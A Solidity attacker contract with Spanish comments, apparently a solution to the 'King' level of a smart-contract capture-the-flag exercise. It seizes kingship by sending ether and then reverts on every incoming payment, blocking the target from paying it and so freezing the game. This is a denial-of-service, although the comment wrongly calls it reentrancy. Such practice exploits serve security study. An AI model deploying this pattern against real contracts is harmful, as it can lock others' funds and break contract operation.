// SPDX-License-Identifier: MIT
// A este contrato atacante:
// 1. Se le va a depositar dinero a este contrato KingAttacker
// 2. Va a enviar dinero al contrato King para ser el "king" del contrato King.
// 3. Una vez siendo el king el KingAttacker contract cuando el verdadero king
//    quiera proclamar poderio (nos quiera transferir) nosotros volveremos a
//    transferir, haciendo un "reentrancy-attack"
pragma solidity ^0.6.0;


contract KingAttacker {

    constructor() public payable {
    }

    receive() external payable {
        // Call the receive king contract again
        revert("This is reverted, you can not be the king");
    }

    function becomeKing(address payable _to) public payable {
        (bool sent, ) = _to.call.value(msg.value)("");
        require(sent, "Failed to send value!");
    }

    // Getter smart contract Balance
    function getSmartContractBalance() external view returns(uint) {
        return address(this).balance;
    }
}
